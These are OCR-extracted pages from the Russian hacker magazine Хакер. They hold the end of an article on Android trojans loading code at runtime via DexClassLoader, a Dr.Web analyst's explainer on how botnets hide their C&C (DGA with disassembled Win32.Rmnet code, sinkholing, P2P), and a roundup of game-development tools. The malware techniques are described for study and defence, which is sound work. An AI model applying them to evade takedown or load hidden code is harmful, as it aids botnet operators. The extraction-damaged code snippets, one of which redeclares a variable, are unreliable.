вертация не идет, в конфиг (файл build.gradle для созданного модуля) нужно
добавить вот такие строки:


task makejar(type: Jar, dependsOn: 'assembleRelease') {
    from fileTree(dir: 'build/intermediates/classes/release')
}

Gradle умеет мно го чего, для него есть отдельная панель справа в IDE. Там
есть много вариантов компиляции, к ним дол жен добавиться еще вари ант
makejar, который мы толь ко что соз дали.





                     Генерация JAR через Gradle

Те перь сконвертируем библиотеку в dex‐файл — это особым обра зом соб‐
ранный java‐код, под ходящий для исполнения вир туальной машиной Dalvik
и ее наследником ART, которые отвечают за запуск приложений в Android.
Для такой конвертации в стандартном SDK есть компилятор dx.


/.../Android/Sdk/build‐tools/версия_Sdk/dx ‐‐dex ‐‐output="/path/
xakep.dex" "/path/xakep.jar"

Ко неч но, динами ческая заг рузка модулей — это не изобретение вирусо писа‐
телей, такая схе ма впол не легальна и используется повсемес тно. Эту воз‐
можность Google добавила очень дав но, еще в 2011 году. Главная при чина
такого решения — ограничение на количество методов, используемых в при‐
ложении, их не может быть больше 65 тысяч.
  Кроме того, удоб нее раз бить при ложение на нес колько составля ющих —
бинарный файл размером в несколько гигабайтов совершенно неудобно
рас пространять. Ты мог заметить, что большинство игр под мобильные плат‐
формы вык ладываются в Google Play только в виде базового лаунчера,
остальное пользователь скачивает напрямую с сер вера разработчиков.
  Для подгрузки таких модулей создан класс DexClassLoader. У него дос‐
тупен только конструктор, который всю работу и выполняет.


 new DexClassLoader(pathToDex, internalStorage, null, classLoaderInst
ance);

В качестве аргумента у него пути к dex‐файлу pathToDex и внутреннему хра‐
нилищу internalStorage, путь  к дополнительным библиотекам (не нуж ны)
и экземпляр класса ClassLoader. Но преж де чем подгружать биб лиотеку, ее
нуж но скачать и разместить во внутренней памяти, она может быть про читана
только оттуда. Но тут никакой магии не нужно — хватит клас сов AsyncTask
и HttpURLConnection.
   Как ты помнишь, у биб лиотеки есть входные параметры, которые как‐то
надо передать. Для этого создается мас сив, в котором нужно обозначить
классы, необходимые биб лиотеке. Сам контекст приложения будет передан
чуть позже, уже при вызове метода.


Class<?> wordClass = dexClassLoader.loadClass("xakep.com.mylibrary.
LibraryClass");
Class<?>[] args = new Class[1];
args[0] = Context.class;
Method libMethod = wordClass.getDeclaredMethod("getInfo", args);
String libMethod = (String) libMethod.invoke(wordClass.newInstance(),
 this);

Тем, кто до это го с проблемой не сталкивался, происходящее будет малопо‐
нят но, и таким читателям помогут ис ходни ки готово го проекта.


PLAYPROTECT, ИЛИ КОСТЫЛЬ ОТ GOOGLE
При ходит пора как‐то упо рядочить жизнь внутри смартфона. Антивирусные
вендоры дав но пыта ются заработать лояльность аудитории — у всех крупных
про изводителей появились мобильные продукты, да еще с широким набором
бесплатных воз можнос тей.
  Компания Google решила, что ей следует начать еще боль ше контролиро‐
вать устройства пользователей, и выпустила продукт под названием Play Pro‐
tect, который в русском варианте зву чит как «Play защита». Похоже, это обыч‐
ный мобильный антивирус с интерес ным лозунгом «Спокойствие  у вас
на ладони» (да, лозунг выг лядит как про паган да онанизма, это вооб ще
легально? — Прим. ред.).





                     Я защищен, ура!

Устанав ливать его не нужно, он уже встро ен в пакет Google Play Service, най ти
его можно в меню при ложе ния Play Market. На рын ке мобильных антивирусов
у специалистов Google серь езное пре имущес тво — им раньше других дос‐
тупны для анализа все приложения из Google Play, и при условии оптимиза‐
ции бизнес‐процессов вирусы они будут находить пер выми.
   Как ты мог заметить из отчетов, тро ян может активно распростра няться
несколько лет и толь ко затем попасть в антивирусные базы. На практике
это озна чает, что зловред, осо бен но если он не заражает все подряд и рас‐
пространен на тысяче‐двух устройств, в антивирусных базах ока жется очень
нескоро. Наде яться на антивирус как панацею я бы не стал, нужно продол‐
жать держать голову свет лой и не искать в Google Play халявы или глупых раз‐
влечений — именно такие люди составляют целевую ауди торию троянов.


СТРОИМ ПРОГНОЗЫ
Как и ожидалось, с ростом пользователей количество угроз тоже увеличи‐
вается. Наверное, нужно ждать, что Google введет какие‐то новшества в сво‐
ем репози тории, слишком уж много там мусора. Отмечу, что экосис тема
Apple выг лядит гораздо лучше — мас совых заражений нет, украсть данные
гораздо слож нее.
   Есть и хорошие новости: в Android‐мире доля ста рых устройств быстро
падает, к октябрю ОС KitKat (4.4) и ста рее уже занимают менее 20% рынка.
Если контроль над качеством кода не ослабнет, то следующий год будет спо‐
кой ней — серьезные уяз вимости появляют ся редко, и глав ной проблемой
ста новит ся челове ческий фактор.
   Ну а наш журнал будет все так же дер жать тебя в курсе происходящего —
естественно, что бы ты применял эти знания толь ко во бла го. Если я что‐то
упустил или есть вопросы, обязательно пиши. Удачи!
MALWARE





                                        Павел Шалин
                                              Аналитик, «Доктор Веб»




       КАК ВЛАДЕЛЬЦЫ БОТНЕТОВ
       СКРЫВАЮТ СВОИ СЕТИ
      И ОБХОДЯТ ОГРАНИЧЕНИЯ





В мире существуют раз ные боты. Есть боты, которые бороз‐
дят просторы морей или просто стоят на месте — как, нап‐
ример, буддистские боты (если что, это такая религи озная
постройка). Но если ты читаешь ][, то наверняка догадался,
что речь пойдет не про них и даже не про ископаемые
бабуш кины чеботы, а про авто номно дей ствующие вре‐
донос ные программы, спо собные выполнять поступающие
извне команды и объединяться в ботнеты.


Одним из первых крупнейших ботнетов принято считать сеть, соз данную
в 2004 году с помощью почтового чер вя Beagle. Этот червь имел собствен‐
ную реали зацию протоко ла SMTP, с помощью которой рассылал себя
по элек тронной почте. Заодно в нем был руткит‐модуль, который поз волял
ему скрывать свое при сутс твие на зараженной машине.
  С тех пор челове чество пережило множес тво нашествий бот‐сетей раз‐
лично го калиб ра. Ушел в исто рию и Rustock, спамив ший с пулемет ной ско‐
ростью в 192 письма за минуту, и Conﬁcker, заразивший десять с полови ной
миллионов машин по всему миру. Это, к слову, был первый в истории ботнет,
за любые све дения о создателях которо го парни из Microsoft предложили
наг раду в 250 тысяч дол ларов. «Wanted, dead or alive», как пел когда‐то старик
Бон Джови.




Как ты знаешь, в ][ пишут не журналисты, а IT‐спецы. Павел Шалин — один
из таких. Он работает ана литиком в компании Dr.Web и при этом ухитряется
пло дотворно писать под псевдонимом «Вален тин Холмогоров», и не только
на тему малвари и хакерс тва, но и доволь но популярную фантасти ку. Из книг
Пав ла на близкие любому хакеру темы мы бы тебе посове товали прочесть
«Бумажное небо» и «PRO Вирусы».


Первые бот‐сети были примитивными. Они имели простую звездообразную
структуру, в центре которой рас полагался управля ющий сервер (Command
and Control Server, C&C), а на вер шинах лучей звезды — инфицирован ные
хосты. Команды и конфиги переда вались ботам по стандартным протоколам,
нап ример через старый доб рый IRC. В этом случае трой подключал ся к опре‐
деленному каналу и начинал слушать команды, которые ботовод отправлял
прямо в чат. Самое сла бое мес то такой архитектуры оче видно: достаточно
грох нуть центральный сервер, и сеть ста новит ся неуправляемой, а отдать
ботам команду на сме ну C&C уже не получит ся.
  Сле дующим эта пом эволюции ботнетов стало появление алгорит мов
динами ческой генерации имен управляющих серверов — DomainGenera‐
tionAlgorithm (DGA). Суть этой технологии проста. Бот содер жит код,
который генери рует доменные имена по специаль ному алгоритму. В резуль‐
тате получается домен, сос тоящий, например, из определен ной последова‐
тель нос ти символов латинского алфавита и цифр. Их легко отличить —
зарегистрировать такой домен пси хически здоровому человеку в голову поп‐
росту не придет.
  На этом домене и поднимается управляющий сер вер. Если этот сервак
однажды прикажет долго жить, нуж но лишь зарегис три ровать сле дующий
и запустить на нем админку. В свою очередь, бот, не получив отклика от C&C,
генери рует несколько новых адресов и начина ет опрашивать их по оче реди,
пока не най дет работа ющий.
  Живучесть ботнета таким образом замет но повышается, да и ботовод
получает уникальную воз можность сберечь пару шекелей: некоторые регис‐
траторы в погоне за прибылью позволяют своим клиентам регистрировать
домены сейчас, а платить за это потом. Если день ги не поступа ют, домен
через какое‐то вре мя просто отрубается. Исполь зуя этот лайфхак, некоторые
особо прижимистые ботоводы меняют C&C раз в пару недель, экономя себе
копе ечку на пиво.
  Некоторые  ботоводы  параллельно  использовали  сразу  несколько
управляющих серверов на отдельных доменах, разбивая свой ботнет на под‐
сети. Вот так, нап ример, выглядит дизассемблированный фраг мент модуля
DGA вируса Win32.Rmnet (для генерации домен ных имен используется алго‐
ритм LCG, линей ный конгру энтный метод).


seg074:2001A91C create_next_domain proc near
thread_start+36 p
seg074:2001A91C
seg074:2001A91C seed            = dwordptr ‐4
seg074:2001A91C initial_seed    = dwordptr  8
seg074:2001A91C hostname        = dwordptr  0Ch
seg074:2001A91C
seg074:2001A91C                 push    ebp
seg074:2001A91D                 movebp, esp
seg074:2001A91F                 add     esp, 0FFFFFFFCh
seg074:2001A922                 push    ebx
seg074:2001A923                 push    ecx
seg074:2001A924                 push    edx
seg074:2001A925                 push    esi
seg074:2001A926                 push    edi
seg074:2001A927                 push    12
seg074:2001A929                 push    [ebp+initial_seed]
seg074:2001A92C                 call    rand_int_modulus
seg074:2001A931                 mov     [ebp+seed], edx
seg074:2001A934                 add     eax, 8
seg074:2001A937             movecx, eax
seg074:2001A939                 movesi, [ebp+hostname]
seg074:2001A93C
seg074:2001A93C loc_2001A93C:                           create
_next_domain+2Dj
seg074:2001A93C                 push    25
seg074:2001A93E                 push    edx
seg074:2001A93F                 call    rand_int_modulus
seg074:2001A944                 add     al, 'a'
seg074:2001A946                 mov     [esi], al
seg074:2001A948                 incesi
seg074:2001A949                 loop    loc_2001A93C
seg074:2001A94B                 mov     byte ptr [esi],
seg074:2001A94E                 push    offset tld_com
seg074:2001A953                 push    [ebp+hostname]
seg074:2001A956                 call    j_lstrcatA
seg074:2001A95B                 xoredx, edx
seg074:2001A95D                 moveax, [ebp+initial_seed]
seg074:2001A960                 movebx, [ebp+seed]
seg074:2001A963                 mulebx
seg074:2001A965                 add     eax, edx
seg074:2001A967                 pop     edi
seg074:2001A968                 pop     esi
seg074:2001A969                 pop     edx
seg074:2001A96A                 pop     ecx
seg074:2001A96B                 pop     ebx
seg074:2001A96C                 leave
seg074:2001A96D                 retn    8
seg074:2001A96D create_next_domain end

Очевидно, что и такой подход имеет свою слабую сторону, а именно: он поз‐
воля ет засин кхо лить домен.



       Sinkhole (англ. «выгребная яма») — этим звуч ным тер мином име нуется
      методика перехвата управле ния ботнетом, подразуме вающая получе-
      ние полного контроля над бот‑сетью с воз можностью не только вес ти
      мониторинг и отсле живать сос тояние сети, но и отда вать команды
      ботам.

Дизассембли ровав образец бота и изу чив его код, вирусные аналитики
получают в свое распоряжение алго ритм, которым бот генерирует адреса
управляющих серверов. Зарегистрировав нес коль ко таких адре сов, спе‐
циалис ты соз дают с их помощью собственные управляющие серверы бот‐
нета, способные в ответ на запрос вредонос ной программы отправить ей
корректный отклик и успешно пройти провер ку на подлинность.
  После это го дос таточно ликвидиро вать действующие управля ющие цен‐
тры бот‐сети — спо собы, я думаю, более‐менее оче видны всем. Утратив
связь с командным сервером, боты начина ют генерировать адреса альтер‐
натив ных управляющих серверов при помощи уже извес тного алгоритма
DGА, а затем устанав ливают связь с «поддель ным» управляющим центром
и пос ле успе ха этой опе рации прекращают поис ки альтернативных коман‐
дных узлов. Управле ние ботнетом захвачено.
  Для защиты от такого беспре дела антивирусных компаний вирмейкеры
при думы вают разнооб разные ухищрения — нап ример, протоколы обме на
данными между ботом и C&C стали снабжать шифрованием. Впро чем,
подоб ные механиз мы используются в малвари и без DGA. Да и вирусописа‐
телям это, в общем‐то, не помогло: против дизассембле ра, как и против
лома, нет надеж ного приема.
  Поэто му следующим этапом раз вития бот‐сетей ста ло использование тех‐
нологии P2P (peer‐to‐peer), или пос троение пиринговых одноранговых сетей.
Такие сети вовсе не исполь зуют управля ющих сер веров, вместо этого они
«общаются» с другими инфи цированными компь ютерами, передавая коман‐
ды по сети от «точки к точке», по тому же принципу, что и тор ренты.
  Поскольку одноранговые сети децен трализованы, их невозможно вывести
из строя, уничтожив одним метким уда ром управляющий сер вер, — его поп‐
росту нет.
  Ярким при мером пиринговой вредоносной сети можно считать ботнет
файлового вируса Win32.Sector, который заразил в общей слож ности более
миллиона компьютеров.
  Подключенный к интерне ту компьютер может не иметь собс твенного
внешнего IP‐адреса, если в сети используется NAT (Network Address Transla‐
tion). Поэтому, заразив компьютер, Win32.Sector про веря ет, есть ли у машины
внешний айпишник. Если есть, бот ста новится нодой (Node), то есть начинает
играть роль мар шрутизатора для других зараженных машин (Bot), не име‐
ющих реального внешнего IP‐адреса.
  Инфицированные компьютеры типа Bot начина ют «общаться» с интерне‐
том и другими зараженными узлами через ноду. Каждый инфициро ванный
узел такой сети получает начальный спи сок из ста IP‐адресов других ботов,
с которы ми он пыта ется установить соеди нение, при чем этот список пери‐
оди чески обновляется. При подоб ной структуре сети потеря одной ноды
(нап ример, если владелец компь ютера вылечит его от вируса) ничем не гро‐
зит всей системе в целом: бот просто подклю чится к другой ноде для получе‐
ния дальнейших управляющих команд.





     Организация одноран говой бот‐сети на примере Win32.Sector

Су ществуют и более слож ные бот неты, которые можно отнести к сме шанному
типу. Нап ример,  Trojan.Dridex.49 для связи с управляющи ми серверами
использует сложную одноранговую бот‐сеть, которая состоит из двух про‐
межуточных слоев прокси. Заразив компь ютер, Trojan.Dridex.49 может при‐
нять на себя одну из трех возможных ролей:
 • Bot — трояны этого типа работают на компь ютерах, не имеющих внешнего
   IP‐адре са. Bot уста навливает связь с управляющим сервером через тро‐
   янов с ролью Node;
 • Node — трояны это го типа работа ют на компьютерах с внешним IP‐адре‐
  сом и переда ют данные от ботов к троянам с ролью AdminNode, а также
   в обратном нап равле нии;
 • AdminNode — как ты мог догадаться, «админская нода». Высшая ступень,
   на которой экземпляры трояна под держивают связь друг с другом, а также
   непос редственно с управляющим сервером.

Таким образом, цепоч ка связи инфицированного компьютера без внешнего
IP с управляющим сервером ботнета выглядит в общем случае сле дующим
образом: Bot → Node → AdminNode → другие AdminNode → C&C. При этом
для обеспечения безопас ности соеди нения экземпля ры трояна обменива‐
ются меж ду собой циф ровыми ключами. Струк тура этой сети показана
на иллюстра ции.





Что бы получить с управля ющего сервера новый перечень IP‐адресов ботов
с ролью Node или конфигурационных дан ных, необ ходимых для выпол нения
веб‐инжектов, тро яны с ролью Bot передают зап рос экземпляру с ролью
Node, и тот переправля ет его админской ноде. Она, в свою очередь, может
перебрасывать его другим AdminNode до тех пор, пока запрос не дос тигнет
управляюще го сервера.
  Зап рошенные данные от управляющего сервера рядово му боту переда‐
ются в обратном иерархичес ком порядке. Точно так же доставля ются допол‐
нительные фун кци ональ ные модули вредонос ной программы: ноды зап‐
рашивают их у управля ющего сервера через AdminNode, а боты получают их
по запросу у нод. Такая мно гоуровневая и запутан ная система зна чительно
затрудняет отсле живание управляющих сер веров и перехват информации.
  Некоторые современные вредонос ные программы, например отдельные
модифи кации банковско го троянца Zeus, используют еще более слож ную
и изощ ренную структуру P2P‐ботнета с применением туннелиро вания.
  Нап ример, запус тившись на целевом компь ютере, такой троян может рас‐
шифровать из собс твенного кон фигурационного файла список других ботов
с ролью Node и попытаться уста новить с ними соединение. А если наладить
связь не удалось, он сгенерирует перечень доменов по алго ритму DGS
и попытается получить актуальный список нод отту да.
  При этом ресурсы таких доменов — это не управля ющие сер веры. Они
прос то хранят переч ни IP‐адресов нод, которые и отдают ботам по запросу.
Связь с истинным управля ющим устанавливается через отдельные ноды,
которые работают как тун нелиру ющий сер вер. Сам злоумышленник, управля‐
ющий бот нетом, тоже передает команды C&C не напрямую, а через тун‐
нель — что бы лучше замес ти следы.





В пос ледние годы стали появлять ся новые схемы ботнетов — с исполь‐
зованием Tor и облачных технологий. Еще в 2008 году были выяв лены трояны,
которые получали команды с определенной учетной записи в Twitter и в спе‐
циально соз данной вирусописа телями ветке Google Groups.
  Для хранения компонентов вредонос ных программ, которые могут быть
загружены и установлены на инфициро ванной машине, нередко используют‐
ся облачные сервисы Google Docs и Google Drive. Нап ример, Google Docs
для обмена данными с C&C использовала обнаруженная в 2012 году вре‐
доносная программа‐бэк дор BackDoor.Makadoc.
   Встро енное Google Docs веб‐приложение Google Docs Viewer обрабаты‐
вало все входящие зап росы, как обычный откры тый прокси‐сер вер. При этом
такие зап росы не вызывают подозрений у встроенного фай рвола Windows,
чем и воспользовались зло умышленни ки.
  Во вре мя обработ ки запросов Google Docs Viewer даже не тре бовал у кли‐
ента авторизации в Google Docs — он прос то перенаправлял их на коман‐
дный сер вер, что еще боль ше облегчило задачу киберпрес тупникам.
  Ви русописатели постоянно изобрета ют новые методи ки управления бот‐
нетами, а вирусные аналити ки, в свою оче редь, неп рерывно совер шенс твуют
инструменты про тиводей ствия им. Это можно сравнить с извечной борьбой
сна ряда и бро ни, которая, как известно, может лишь остановить ся на вре мя,
но не закон чится никогда.
 КОДИНГ



ПОДБИРАЕМ НАБОР
БЕСПЛАТНЫХ ПРОГРАММ
ДЛЯ РАЗРАБОТКИ ИГР





     Юрий Язев
Программист, разработчик
компьютерных игр. Старый
  автор журнала «Хакер»
   yazevsoft@gmail.com





 Игровой движок — сердце компьютерной игры и цен траль‐
 ный  инструмент  геймдевело пера. Цен тральный,  но  не
 единс твенный — без трехмерно го гра фического редактора,
 программы для создания ани миро ванных персонажей, зву‐
 кового редактора, средства для создания уровней, средства
 разработки шриф тов и мно гого другого труд инди‐раз работ‐
 чика был бы прос то невозможен. В этой статье мы с тобой
 подберем полный комплект бесплат ного либо недорогого
 ПО, которое пригодится тебе в нелегкой работе инди виду‐
 ального разработчика игр. И нет, это будет не Unity 3D + Vis‐
 ual Studio + Photoshop + Maya.


 ИГРОВЫЕ ДВИЖКИ
 В статьях про выбор игро вого движка («Обзор самых популярных движков
 для раз работ ки игр» и «Сравниваем 6 лучших игровых движков») я расска‐
 зывал пре имущественно о топовых продук тах, которые у всех на слуху: Torque
 2D/3D, Unity 3D, Unreal Engine 4, CryEngine. По сути, с ними все понятно,
 за про шедший год мало что изменилось, а в этой статье мы коснемся лишь
 того, что не вош ло в предыдущие, — рассмотрим инте рес ные, но не очень
 популярные «модели».
   Компания TheGameCreators гордо соз дает тулзы для разработки игр
 с 1999 года. И при том, что многие тулзы дру гих вендоров бес платны, TGC
 про дает свои про дукты и очевидно имеет профит. На ее счету такие проекты,
 как DarkBASIC, DarkGDK (ког да‐то очень дав но я написал об этом движ ке
 целый цикл ста тей), FPS Creator. Сейчас все эти про дукты отданы в сооб‐
 щество открытых исходников и хостятся на GitHub. DarkGDK всегда представ‐
 лял собой либу для C++. В настоящее вре мя ком пания активно развивает три
 про дукта: MyWorld (для создания RPG), GameGuru (для соз дания 3D‐шутеров
 без программирова ния) и AppGameKit.
   AGK — флагманский про дукт компании TGC, уни версальный движок,
 с помощью которого можно создавать игры любых жанров под все рас‐
 пространенные  платформы:  Windows,   Linux,  macOS,   Android,   iOS,
 HTML5 и даже для Raspberry Pi (модуль ска чива ется отдельно). И все это еди‐
 ножды написанный код! Этим сей час, правда, уже никого не удивишь, но все
 рав но приятно. С помощью AGK можно создавать не толь ко 2D‐ и 3D‐игры,
 но и обыкновенные приложения.
   AGK состоит из двух уровней  (tiers).  Tier 1 — это раз работка игры
 с помощью многофун кциональ ного скрип тового язы ка (модифицированный
 под игры легкий в изучении BASIC). Tier 2 представляет собой фрей мворк,
 под клю чаемый к C++. Таким образом, AppGameKit — это смесь модер‐
 низиро ванных и улуч шенных ста рых про дуктов ком пании: DarkBASIC и Dark‐
 GDK в одном флаконе.
   Неваж но, какой уровень будет исполь зовать ся для разработ ки, в обоих
 слу чаях игру можно размножить на все под держиваемые платформы. На пер‐
 вом уровне код пишется в специальной IDE для скриптового язы ка AGK,
 во вто ром — в любимой среде раз работки на C++, например Visual Studio.
   Вдо бавок AGK поддерживает легкую интегра цию с PHP для раз работки
 онлайновых игр и при ложений. Среди ключевых возможностей разрабаты‐
 ваемых в AGK игр: поддержка физичес ких движков Box 2D и 3D Bullet (соот‐
 ветствен но для двумерной и трехмерной графики), системы частиц, проигры‐
 вание видео, отоб ражение рекламы, поддер жка камеры и разные социаль‐
 ные сервисы.
   AGK прекрасно подходит для прототипирования и обкатки новых механик,
 также его вполне мож но использовать для раз работки законченных решений.
 Если ты решишь купить этот продукт, рекомендую сделать это в Steam, а не
 с офи циального сайта, поскольку цена приятно отличается.





                          Редактор AGK

 Еще один движок, на котором я хочу остановиться, — это Godot. С недавнего
 вре мени он стал для меня интересен, и вот почему. Он пол ностью открытый
 и кросс‐платформенный. На нем мож но разрабатывать игры, сидя в Windows,
 Linux, macOS, а создавать их для Windows Desktop, Windows Universal, Linux,
 macOS, BSD, Haiku, Android, iOS, BlackBerry 10 и HTML5. Начало движку Godot
 было положено сот рудни ками аргентинской ком пании Okam в 2007 году.
 Изначально он создавался для собственных проектов компании, однако пос‐
 ле того, как он достиг определенного уров ня, авто ры решили выложить его
 на GitHub. Это произошло в 2014 году. С того вре мени сообщес тво ста ло
 помогать с разработкой.
   С самого начала дви жок создавался как пол ноценная среда для разработ‐
 ки игр, не требующая пос торонних средств кодиро вания. Он содержит ори‐
 гинальный интерфейс, собствен ный скрип товый язык  GDScript, пол ный
 исходный код на C++ и множество типов объектов, используемых для раз‐
 работ ки игр. Некото рые из них служат для создания поль зовательского
 интерфейса, другие предос тавляют спрай ты (служат для создания 2D‐игр),
 с помощью третьих мож но создавать физичес кие объекты, четвертые —
 для видео и звуков, пятые помога ют добавить сис темы час тиц раз ной кон‐
 фигурации, шестые — ани мированные 3D‐объ екты, седьмые — целые сцены
 и про чее.
   Скрип товый язык напоминает Python, но отличает ся от него в лучшую сто‐
 рону, нап ример наличием строгой типизации. Редактор кода, встро енный
 в Godot, обладает всеми харак теристиками современных средств прог‐
 рамми рования: тут есть подсветка синтаксиса, под станов ка, вставка авто‐
 отступов и так далее. Из дополнительных особен ностей стоит отметить
 наличие дебаггера, профай лера и монито ра виде опа мяти.
    Графичес кая сос тавляющая в Godot осно вана на OpenGL ES 2. Име ется
 редак тор для визуаль ного соз дания и модификации шейдеров, есть собс‐
 твен ный язык для их написа ния. Godot обладает встроенным редактором
 для создания ани мации, как персонажей, так и других объектов. Для дос‐
 тижения при емле мого уровня опти мизации раз работчики Godot отка зались
 от использования физических движков третьих фирм, создав с нуля решение
 для прос чета физических взаимодействий.





                               Godot

 Что бы собирать версии для разных плат форм, достаточно скачать экспортер
 и при менить его для соз дания бандла под опре деленную платформу.
 Исходный проект менять не понадобится.




 За год на инди‐сце не про изош ло мно го интересного. Как я и пред полагал,
 в настоящее время инди, пытаясь соперничать с «большими» раз работ‐
 чиками, сидящими под кры лом у издателей, начали осваивать просторы 3D
 и глобального онлай на. По большей час ти это сетевые сессионные шутеры,
 но иногда встре чают ся и MMO. Это му поспособство вали современные игро‐
 вые технологии, в частности движки. Меж ду тем многие инди (и их боль шинс‐
 тво)  по‐прежнему  раз рабаты вают  двумер ные  экшены  и  адвенчуры
 для мобильных платформ и ПК. Конкурируя с AAA‐проекта ми, инди порой
 ухит ряются сделать игру, по своей продуманности, подаче сюжета, глубине
 стиля и красоте пре восходящую конкурен тов из мира «больших» игр.



 ГРАФИЧЕСКИЕ РЕДАКТОРЫ
 К незаме нимым инструментам для разработ ки любой игры относятся и гра‐
 фичес кие редак торы. Без них никак. И неваж но, двумер ную или трехмерную
 игру ты разрабатываешь, дву мерные редак торы понадо бятся в любом слу чае.
   Честно скажу, мне не нра вится Photoshop, я им не пользуюсь уже мно го
 лет. Из проприетарных редак торов мне больше по душе пакет программ
 CorelDRAW. В этот пакет входят прек расный векторный редактор, собственно
 CorelDRAW и Corel Photo‐Paint, не уступающий по функци ональнос ти Phot‐
 oshop. Мне кажется, что CorelDRAW пре восходит Adobe Illustrator, но пос‐
 ледний я не юзал. Одна ко CorelDRAW стоит охренительных денег. :‐) Поэтому,
 когда я стал добросовестным инди, то отказал ся от него и разом потерял век‐
 торный и растровый редакторы.
   Между тем в мире open source полно интересных графичес ких редак‐
 торов. Сре ди них есть безусловные лидеры, разработ ка которых ведет ся уже
 не один год. По функциональности они не уступают проп риетар ным решени‐
 ям. Наилучшим выбором сре ди растровых редакторов для меня стал GIMP.
 Программа разрабатывается с 1995 года и содержит все инс трументы
 и подав ляющее боль шинство опций и нас троек «Фотошопа».





                            GIMP

 Из векторных редак торов оче видный выбор — это Inkspace. Inkspace выг‐
 лядит и работает, как CorelDRAW, набор инс трумен тов примерно похожий.





                                  Inkspace

 Инс трументы рисования и заливки, большой набор шаб лонных фигур, изме‐
 нения фор мы  и мно гое  другое.  Есть  слои, филь тры  и  рас ширения.
 В общем — все, что нужно для про дуктивной работы.


 СОФТ ДЛЯ 3D-МОДЕЛИРОВАНИЯ
 Maya, LightWave, 3ds Max, ZBrush — отличные программы трех мерного
 модели рования и ани мации, но для инди они, увы, слишком дороги. Какие
 решения тут может предложить open source?
   Самый популярный редак тор для 3D‐моделирования с откры тым кодом,
 безусловно, Blender. Он появился еще в 1994‐м и пер вые годы своей жиз ни
 был коммерческим продуктом (вы будете очень сме ять ся, но исполь зование
 этого редак тора мы в «Хакере» рекомендовали еще в начале века. — Прим.
 ред.). В 2002‐м его код был открыт и опубликован по сво бодной лицензии.
 С того вре мени и ведется его активное развитие.
    Blender всегда славился своей сложностью. Отчасти причиной этого стали
 его первые вер сии, где большинс тво команд выпол нялись через нажатие кла‐
 виатур ных комбинаций. Сейчас дела в этом отношении заметно улучшились,
 и для вызова прак тически любой команды можно использовать либо кнопку
 на панели инстру ментов, либо пункт в меню.
   Кроме средств модели рования (полиго нальное и скульптурное модели‐
 рование, кривые Безье, NURBS, Metaballs), в Blender есть механизмы рен‐
 деринга, тулзы для анимации (инверсная, ске летная или нелинейная ани‐
 мация), создание и редактирова ние видео, физика (динамика мягких и твер‐
 дых тел, обрабатываемые с помощью физичес кого движка Bullet), система
 волос.
    Также Blender содержит Blender Game Engine, с помощью которого можно
 раз рабатывать прос тую игровую логику, обра батывать столкновения и опи‐
 сывать реакции. Код игровой логики пишется на языке Python. На нем же
 можно и расширять ассортимент тулз, вхо дящих в Blender.





                       Blender с загруженной моделью

 По мимо Blender, существует еще одно бесплатное (пусть и не открытое)
 решение — это TrueSpace.
   До 2008 года эту программу раз рабаты вали в ком пании Caligari. Затем
 права купила Microsoft, а в 2010 году разработка была прекращена, и пос‐
 ледняя вер сия (7.61) выпущена бесплатно. Кор нями это при ложе ние ухо дит
 в далекий 1986 год. Тогда оно раз рабатывалось для компьютеров Amiga.
 Только в 1994 году выш ла первая вер сия TrueSpace для Windows.
    Тех нологии, заложенные в TrueSpace, использованы Microsoft в приложе‐
 нии 3D Builder (доступно бесплатно в Windows Store).





                           Windows Store

 При ложе ние поз воляет сканировать, импортировать из широкого диапазона
 формата файлов, редактировать, выстра ивать трехмерные объ екты и рас‐
 печаты вать модели на 3D‐принтере.





                         3D Builder

 Лет десять тому назад, когда я довольно плотно занимал ся трехмерным
 модели рованием и анимаци ей, мне сильно нравилась эта программа с ее
 кле вым и не похожим ни на какие дру гие моделеры интерфейсом.


 3D-персонажи
 Для быстро го создания трехмерных персонажей гуманоидного типа можно
 вос поль зовать ся программой MakeHuman с открытым исходным кодом. Соз‐
 дание персонажа начинается с настрой ки параметров «бол ванки» (пер‐
 сонажа по умолчанию). Среди параметров: пол, возраст, рост, вес, мус‐
 кулатура, поза и мно гое другое. Приложение в чем‐то напоминает Blender,
 но отли чается простым и понят ным интерфейсом.





                         MakeHuman

 Ны неш няя версия 1.1.0 раз работана на C++ и Python. Графика обрабаты‐
 вается и выводится средства ми OpenGL. Изна чаль но в 1999 году, когда
 это при ложение появи лось, оно представляло собой плагин для Blender
 и называлось MakeHead. Позднее, упершись в предел возможнос тей Python
 API, команда решила начать про ект с нуля на C. Еще позже он был перене сен
 на C++. Между тем из‐за того, что прог рамму ста ло сложно разрабаты вать
 и под держи вать, в 2009 году раз работчики приняли решение вернуть ся
 к Python с ядром на C++, при этом они начали обо собленный от Blender про‐
 ект.  Таким  образом,  пер вая  стабильная  вер сия  MakeHuman  вышла
 в 2014 году.
   Подробнее работу с трехмерны ми персонажами и еще одно полез ное
 при ложе ние (Fuse) я раз бираю в статье на моем сайте.


                                      Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

       ПОДБИРАЕМ НАБОР БЕСПЛАТНЫХ
       ПРОГРАММ ДЛЯ РАЗРАБОТКИ ИГР





СОЗДАНИЕ КАСТОМНЫХ ШРИФТОВ
В связи с тем что мно гие шриф ты вовсе не бес плат ны и охраняются автор‐
скими правами, нам необ ходимо использовать собственные шрифты. Для их
создания существует ряд прог рамм — как платных, так и свободных.
  Из числа пос ледних можно выделить два инс трумента. Первый — Font‐
Forge. Он представляет собой полноценный инстру мент для редак тирования
име ющих ся и создания новых шрифтов в форматах TrueType, PostScript
и OpenType. Изначаль но FontForge был программой для Linux, поэтому осно‐
ван на GTK+ и в Windows работает в Cygwin.





                          FontForge под Windows

Вторая полезная тулза — это BMFont. Она нужна для превращения любого
из установленных в системе шрифтов в компактную рас тро вую раскладку,
которую удоб но  заг ружать из  игры. Программа даже уме ет сохранять
в отдельном фай ле координаты всех символов и раз меры промежутков меж‐
ду ними. В общем, BMFont — наипо лез ней ший инс трумент в арсенале раз‐
работ чика игр.





                             BMFont


СОЗДАНИЕ УРОВНЕЙ
В двумерной игре карта представляет собой задний фон плюс эле менты,
с которыми могут взаимодей ствовать персонажи и NPC. Все это можно сде‐
лать вручную: нарисовать отдельно фон, элемен ты, ском поновать их в раз‐
рабаты ваемой игре, соз дав в движке для каж дого отдельного элемента уни‐
кальный объект.
  Но есть спо соб лучше — воспользоваться редактором тайловых карт. Тай‐
ловую, или пли точ ную, графику используют, ког да соз дают игро вые уровни,
запол няя большое пространство подготов ленными плитками. Если все пра‐
вильно распределить и добавить вариации, то игрок не заметит пов торений.
  Один из самых рас пространенных редакторов тайловых карт — свобод ная
